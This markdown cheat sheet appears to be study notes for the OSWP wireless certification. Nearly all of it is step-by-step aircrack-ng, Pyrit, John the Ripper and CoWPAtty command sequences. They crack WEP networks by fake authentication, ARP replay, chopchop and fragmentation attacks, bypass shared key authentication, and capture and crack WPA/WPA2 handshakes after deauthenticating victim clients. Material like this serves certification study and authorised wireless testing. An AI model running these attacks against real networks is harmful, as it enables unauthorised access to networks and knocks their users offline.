# OSWP
Offensive Security Wireless Professional

## WEP (Wired Equivalent Privacy)

### Open Authentication

#### Cracking WEP with connected clients

```
airmon-ng start <INTERFACE> <channel>
airodump-ng -c <CHANNEL> –bssid <BSSID> -w <FILENAME> wlan0mon
aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <MAC wlan0mon> wlan0mon (Fake authentication)
aireplay-ng -3 -b <BSSID> -h <MAC wlan0mon> wlan0mon (ARP replay attack)
aireplay-ng -0 1 -a <BSSID> -c <MAC VICTIM> wlan0mon (Deauthentication attack)
aircrack-ng <.CAP FILENAME>
```

#### Cracking WEP via a connected client

```
airmon-ng start <INTERFACE> <CHANNEL>
airodump-ng -c <CHANNEL> –bssid <BSSID> -w <FILENAME> wlan0mon
aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <MAC INTERFACE> wlan0mon (Fake authentication)
aireplay-ng -2 -b <BSSID> -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 wlan0mon (Interactive Packet Replay Attack)
aircrack-ng -z <.CAP FILENAME>
```

#### Cracking clientless WEP network

##### KoreK chopchop attack

```
airmon-ng start <INTERFACE> <CHANNEL>
airodump-ng -c <CHANNEL> --bssid <BSSID> -w <FILENAME> wlan0mon
aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <MAC INTERFACE> wlan0mon
aireplay-ng -4 -b <BSSID> -h <MAC INTERFACE> wlan0mon
packetforge-ng -0 -a <BSSID> -h <MAC INTERFACE> -l <SOURCE IP> -k <DEST IP> -y <XOR FILENAME> -w <FILENAME>
aireplay-ng -2 -r <PACKET FILENAME> wlan0mon
aircrack-ng <.CAP FILENAME>
```

##### Fragmentation attack

```
airmon-ng start <INTERFACE> <CHANNEL>
airodump-ng -c <CHANNEL> --bssid <BSSID> -w <FILENAME> wlan0mon
aireplay-ng -1 6000 -e <ESSID> -a <BSSID> -h <MAC INTERFACE> wlan0mon
aireplay-ng -5 -b <BSSID> -h <MAC INTERFACE> wlan0mon
packetforge-ng -0 -a <BSSID> -h <MAC INTERFACE> -l <SOURCE IP> -k <DEST IP> -y <XOR FILENAME> -w <FILENAME>
aireplay-ng -2 -r <PACKET FILENAME> wlan0mon
aircrack-ng <.CAP FILENAME>
```

### Shared Key Authentication

#### Bypassing WEP Shared Key Authentication

```
airmon-ng start <INTERFACE> <CHANNEL>
airodump-ng -c <CHANNEL> --bssid <BSSID> -w <FILENAME> wlan0mon
aireplay-ng -0 1 -a <BSSID> -c <MAC VICTIM> wlan0mon
aireplay-ng -1 0 -e <ESSID> -y <.XOR FILENAME> -a <BSSID> -h <MAC INTERFACE> wlan0mon
aireplay-ng -3 -b <BSSID> -h <MAC INTERFACE> wlan0mon
aireplay-ng -0 1 -a <BSSID> -c <MAC VICTIM> wlan0mon
aircrack-ng <.CAP FILENAME>
```

---

## WPA/WPA2 (Wi-Fi Protected Access)

### Pre-Shared Key Authentication

#### Cracking WPA with Aircrack-ng

```
airmon-ng start <INTERFACE> <channel>
airodump-ng -c <CHANNEL> --bssid <BSSID> -w <FILENAME> wlan0mon
aireplay-ng -0 1 -a <BSSID> -c <MAC VICTIM> wlan0mon
```

##### Dictionary mode

```
aircrack-ng -w <WORDLIST> <.CAP FILENAME>
```

##### Database mode

```
aircrack-ng -r <DB NAME> <.CAP FILENAME>
```

#### Cracking WPA with Pyrit

```
airmon-ng start <INTERFACE> <CHANNEL>
pyrit -r <INTERFACE> -o <FILENAME> stripLive
aireplay-ng -0 1 -a <BSSID> -c <MAC VICTIM> wlan0mon
```

##### Dictionary mode

```
pyrit -r <.CAP FILENAME> -i <WORDLIST> -b <BSSID> attack_passthrough
```

##### Database mode

```
pyrit -i <WORDLIST> import_passwords
pyrit -e <ESSID> create_essid
pyrit batch
pyrit -r <.CAP FILENAME> -b <BSSID> attack_db
```

#### Cracking WPA with John the Ripper (JTR)

```
./john --wordlist=<WORDLIST> --rules --stdout | aircrack-ng -e <ESSID> -w - <.CAP FILENAME>
```

#### Cracking WPA with CoWPAtty

```
cowpatty -r <.CAP FILENAME> -f <WORDLIST> -s <ESSID>
```
